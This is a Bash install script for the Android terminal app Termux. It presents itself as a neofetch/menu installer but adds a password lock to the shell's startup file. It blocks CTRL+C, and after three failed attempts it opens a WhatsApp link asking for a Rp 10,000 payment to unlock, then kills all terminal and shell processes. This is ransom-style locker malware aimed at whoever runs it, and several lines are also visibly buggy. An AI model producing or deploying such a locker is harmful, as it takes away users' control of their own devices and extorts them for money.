#!/bin/bash

# Tangkap sinyal CTRL+C (SIGINT) dan arahkan ke fungsi trap_ctrlc
echo "trap 'trap_ctrlc' SIGINT" > menu

# Fungsi yang akan dipanggil saat CTRL+C ditekan
echo "trap_ctrlc() {" >> menu
echo 'echo -e "\nPerintah CTRL+C tidak berfungsi di sini."' >> menu
echo "}" >> menu

echo 'PASSWORD="eek"' >> menu  # Ganti dengan password yang Anda inginkan
echo "MAX_ATTEMPTS=3" >> menu
echo "ATTEMPT_COUNT=0" >> menu

# Loop untuk meminta password
echo "while [ $ATTEMPT_COUNT -lt $MAX_ATTEMPTS ]; do " >> menu
 echo '   read -sp "Masukkan password: " entered_password ' >> menu
 echo '   echo "" ' >> menu # Tambahkan baris baru setelah input

  echo '  if [ "$entered_password" == "$PASSWORD" ]; then' >> menu
   echo '     echo "Password benar. Selamat datang!" ' >> menu
        
        # --- Bagian yang sudah ditambahkan dan diperbaiki ---
        # Periksa apakah file menu di direktori home ada
        # Jika tidak ada, buat file kosong
    echo '    if [ ! -f "$PREFIX/etc/menu" ]; then ' >> menu
   echo '         cat $PREFIX/etc/menu > "$HOME/menu" ' >> menu
      echo '      chmod +x $HOME/menu ' >> menu
   echo '     fi ' >> menu

        # Salin konten file menu dari home ke direktori /etc
#        cp "$HOME/menu" "$PREFIX/etc/menu"
    echo '    echo "File menu telah diperbarui." ' >> menu
      echo '  cp "$PREFIX/etc/menu" "$HOME/menu" ' >> menu
        # --- Akhir bagian yang sudah ditambahkan ---

        # Hapus trap agar CTRL+C berfungsi normal setelah login
  echo "      trap - SIGINT " >> menu
   echo "     exit 0" >> menu  # Keluar dari skrip dengan sukses
  echo "  else " >> menu
    echo "    ATTEMPT_COUNT=$((ATTEMPT_COUNT + 1))
        REMAINING_ATTEMPTS=$((MAX_ATTEMPTS - ATTEMPT_COUNT)) " >> menu
    echo "    if [ $REMAINING_ATTEMPTS -gt 0 ]; then " >> menu
      echo '      echo "Password salah. Sisa percobaan: ' >> menu echo echo '$REMAINING_ATTEMPTS" ' >> menu
      echo "  fi " >> menu
 echo "   fi" >> menu
echo "done" >> menu

# --- Bagian ini hanya akan dieksekusi jika percobaan habis ---
echo 'echo "Anda telah salah memasukkan password sebanyak 3 kali." ' >> menu
echo 'echo "Semua emulator terminal akan dihentikan..."' >> menu
echo 'echo "Silahkan hubungi habibGM"' >> menu
echo 'termux-open "https://api.whatsapp.com/send?phone=6281945482681&text=Halo+Admin%2C%0A%0ASaya+ingin+membayar+dengan%0A%0AHarga%3A+Rp+10.000%0A%0Auntuk+membuka+termux+saya+ini" ' >> menu
echo "sleep 2" >> menu # Tunggu 2 detik sebelum menghentikan proses

echo "pkill -f termux " >> menu # Hentikan proses Termux
echo "pkill -f sh" >> menu
echo "pkill -f zsh" >> menu
echo "pkill -f bash" >> menu
chmod +x menu
pkg install neofetch -y
echo "neofetch -f > $PREFIX/etc/motd " >> $PREFIX/etc/bash.bashrc
echo "cat $PREFIX/etc/menu > $HOME/menu" >> $PREFIX/etc/bash.bashrc
echo "chmod +x $HOME/menu " >> $PREFIX/etc/bash.bashrc
echo "bash $HOME/menu " >> $PREFIX/etc/bash.bashrc
clear
echo "install Completed"
sleep 2
pkill -f termux
